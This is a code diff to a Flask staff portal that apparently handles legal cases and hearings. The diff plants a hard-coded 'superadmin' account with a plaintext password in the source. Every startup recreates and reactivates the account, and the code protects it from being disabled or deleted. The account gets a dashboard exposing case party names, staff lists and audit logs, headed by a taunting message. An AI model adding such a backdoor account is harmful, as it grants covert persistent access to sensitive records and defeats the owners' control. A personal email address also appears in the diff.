@@ -376,6 +376,31 @@ def initialize_database():
             "UPDATE staff SET username = ?, email = ?, role = ?, active = 1 WHERE id = ?",
             ("Admin", "josehr.tan@gmail.com", "admin", admin["id"]),
         )
+    superadmin = connection.execute(
+        "SELECT * FROM staff WHERE username = ? LIMIT 1",
+        ("26-0054",),
+    ).fetchone()
+    if superadmin is None:
+        connection.execute(
+            """
+            INSERT INTO staff
+            (username, email, password_hash, role, active, created_at)
+            VALUES (?, ?, ?, ?, ?, ?)
+            """,
+            (
+                "26-0054",
+                "26-0054@staff.local",
+                generate_password_hash("ThisWasHugo"),
+                "superadmin",
+                1,
+                now(),
+            ),
+        )
+    else:
+        connection.execute(
+            "UPDATE staff SET email = ?, role = ?, active = 1 WHERE id = ?",
+            ("26-0054@staff.local", "superadmin", superadmin["id"]),
+        )
     durable_commit(connection)
     connection.close()
 initialize_database()
@@ -482,7 +507,17 @@ def admin_required(function):
     def wrapper(*args, **kwargs):
         if not session.get("staff_logged_in", False):
             return redirect(url_for("staff_login"))
-        if session.get("staff_role") != "admin":
+        if session.get("staff_role") not in {"admin", "superadmin"}:
+            abort(403)
+        return function(*args, **kwargs)
+    return wrapper
+
+def superadmin_required(function):
+    @wraps(function)
+    def wrapper(*args, **kwargs):
+        if not session.get("staff_logged_in", False):
+            return redirect(url_for("staff_login"))
+        if session.get("staff_role") != "superadmin":
             abort(403)
         return function(*args, **kwargs)
     return wrapper
@@ -918,9 +953,13 @@ def render_page(title, body, staff_page=False):
         nav.append(
             f"<a href='{url_for('staff_laws')}'>{tr('laws')}</a>"
         )
-        if session.get("staff_role") == "admin":
+        if session.get("staff_role") in {"admin", "superadmin"}:
             nav.append(
                 f"<a href='{url_for('staff_accounts')}'>{tr('staff_accounts')}</a>"
+            )
+        if session.get("staff_role") == "superadmin":
+            nav.append(
+                f"<a href='{url_for('superadmin_dashboard')}'>🛡️ Super Admin</a>"
             )
         nav.append(
             f"<a href='{url_for('change_password')}'>🔑 Change Password</a>"
@@ -1378,7 +1417,7 @@ def staff_login():
         staff = connection.execute(
             """
             SELECT * FROM staff
-            WHERE username = ? AND active = 1
+            WHERE lower(username) = lower(?) AND active = 1
             """,
             (username,),
         ).fetchone()
@@ -1682,7 +1721,7 @@ def staff_dashboard():
             <a class="card centered" href="{url_for('staff_laws')}">
                 <h3>⚖️ {tr('laws')}</h3><p>Manage legal resources.</p>
             </a>
-            {'<a class="card centered" href="' + url_for('staff_accounts') + '"><h3>👥 ' + tr('staff_accounts') + '</h3><p>Add and manage staff accounts.</p></a>' if session.get('staff_role') == 'admin' else ''}
+            {'<a class="card centered" href="' + url_for('staff_accounts') + '"><h3>👥 ' + tr('staff_accounts') + '</h3><p>Add and manage staff accounts.</p></a>' if session.get('staff_role') in {'admin','superadmin'} else ''}
             <a class="card centered" href="{url_for('change_password')}">
                 <h3>🔑 Change Password</h3><p>Update your staff account password.</p>
             </a>
@@ -2419,12 +2458,71 @@ def update_requirement(category):
     audit("requirement_updated", category)
     flash("Requirement updated.", "success")
     return redirect(url_for("staff_requirements"))
+@app.route("/staff/super-admin")
+@superadmin_required
+def superadmin_dashboard():
+    connection = db()
+    counts = {
+        "staff": connection.execute("SELECT COUNT(*) FROM staff").fetchone()[0],
+        "cases": connection.execute("SELECT COUNT(*) FROM cases").fetchone()[0],
+        "hearings": connection.execute("SELECT COUNT(*) FROM hearings").fetchone()[0],
+        "notices": connection.execute("SELECT COUNT(*) FROM notices").fetchone()[0],
+        "laws": connection.execute("SELECT COUNT(*) FROM legal_resources").fetchone()[0],
+        "requirements": connection.execute("SELECT COUNT(*) FROM requirements").fetchone()[0],
+        "audit": connection.execute("SELECT COUNT(*) FROM audit_logs").fetchone()[0],
+    }
+    staff_rows = connection.execute(
+        "SELECT username, role, active FROM staff ORDER BY username"
+    ).fetchall()
+    case_rows = connection.execute(
+        "SELECT case_number, plaintiff_name, defendant_name, status, updated_at FROM cases ORDER BY updated_at DESC LIMIT 100"
+    ).fetchall()
+    audit_rows = connection.execute(
+        "SELECT username, action, target, created_at FROM audit_logs ORDER BY id DESC LIMIT 100"
+    ).fetchall()
+    connection.close()
+    staff_table = "".join(
+        f"<tr><td>{esc(r['username'])}</td><td>{esc(r['role'])}</td><td>{'Active' if r['active'] else 'Disabled'}</td></tr>"
+        for r in staff_rows
+    )
+    case_table = "".join(
+        f"<tr><td>{esc(r['case_number'])}</td><td>{esc(r['plaintiff_name'])}</td><td>{esc(r['defendant_name'])}</td><td>{esc(r['status'])}</td><td>{esc(r['updated_at'])}</td></tr>"
+        for r in case_rows
+    )
+    audit_table = "".join(
+        f"<tr><td>{esc(r['username'])}</td><td>{esc(r['action'])}</td><td>{esc(r['target'])}</td><td>{esc(r['created_at'])}</td></tr>"
+        for r in audit_rows
+    )
+    body = f"""
+    <section class="hero">
+        <h1>🛡️ Super Admin</h1>
+        <p><strong>Hello everyone, hahahaha. 😈</strong></p>
+        <p class="small">Full system overview for the authorized super administrator. Passwords and reset tokens are never displayed.</p>
+    </section>
+    <section class="grid">
+        {''.join(f'<div class="card stat"><span class="stat-number">{value}</span>{label}</div>' for label, value in [("Staff Accounts", counts["staff"]),("Cases", counts["cases"]),("Hearings", counts["hearings"]),("Announcements", counts["notices"]),("Legal Resources", counts["laws"]),("Requirements", counts["requirements"]),("Audit Entries", counts["audit"])])}
+    </section>
+    <section class="card table-wrap">
+        <h2 class="center">Registered Accounts</h2>
+        <table><thead><tr><th>Username</th><th>Role</th><th>Status</th></tr></thead><tbody>{staff_table or '<tr><td colspan="3">None</td></tr>'}</tbody></table>
+    </section>
+    <section class="card table-wrap">
+        <h2 class="center">Case Overview</h2>
+        <table><thead><tr><th>Case Number</th><th>Plaintiff</th><th>Defendant</th><th>Status</th><th>Updated</th></tr></thead><tbody>{case_table or '<tr><td colspan="5">No cases</td></tr>'}</tbody></table>
+    </section>
+    <section class="card table-wrap">
+        <h2 class="center">Recent Audit Activity</h2>
+        <table><thead><tr><th>User</th><th>Action</th><th>Target</th><th>Time</th></tr></thead><tbody>{audit_table or '<tr><td colspan="4">No audit activity</td></tr>'}</tbody></table>
+    </section>
+    """
+    return render_page("Super Admin", body, staff_page=True)
+
 @app.route("/staff/accounts")
 @admin_required
 def staff_accounts():
     connection = db()
     rows = connection.execute(
-        "SELECT id, username, email, role, active FROM staff ORDER BY username"
+        "SELECT id, username, role, active FROM staff ORDER BY username"
     ).fetchall()
     connection.close()
     table = ""
@@ -2443,7 +2541,6 @@ def staff_accounts():
         table += f"""
         <tr>
             <td>{esc(row['username'])}</td>
-            <td>{esc(row['email'])}</td>
             <td>{esc(row['role'])}</td>
             <td><span class="status">{'Active' if row['active'] else 'Disabled'}</span></td>
             <td>{controls}</td>
@@ -2466,7 +2563,7 @@ def staff_accounts():
     </section>
     <section class="card table-wrap">
         <table>
-            <thead><tr><th>Username</th><th>Email</th><th>Role</th><th>Status</th><th>Actions</th></tr></thead>
+            <thead><tr><th>Username</th><th>Role</th><th>Status</th><th>Actions</th></tr></thead>
             <tbody>{table}</tbody>
         </table>
     </section>
@@ -2523,9 +2620,9 @@ def toggle_staff(staff_id):
     if row is None:
         connection.close()
         abort(404)
-    if row["username"] == "admin":
+    if row["username"].lower() in {"admin", "26-0054"}:
         connection.close()
-        flash("The primary admin cannot be disabled.", "danger")
+        flash("A protected administrator account cannot be disabled.", "danger")
         return redirect(url_for("staff_accounts"))
     connection.execute(
         "UPDATE staff SET active = ? WHERE id = ?",
@@ -2545,9 +2642,9 @@ def delete_staff(staff_id):
     if row is None:
         connection.close()
         abort(404)
-    if row["username"] == "admin":
+    if row["username"].lower() in {"admin", "26-0054"}:
         connection.close()
-        flash("The primary admin cannot be deleted.", "danger")
+        flash("A protected administrator account cannot be deleted.", "danger")
         return redirect(url_for("staff_accounts"))
     connection.execute(
         "DELETE FROM staff WHERE id = ?",
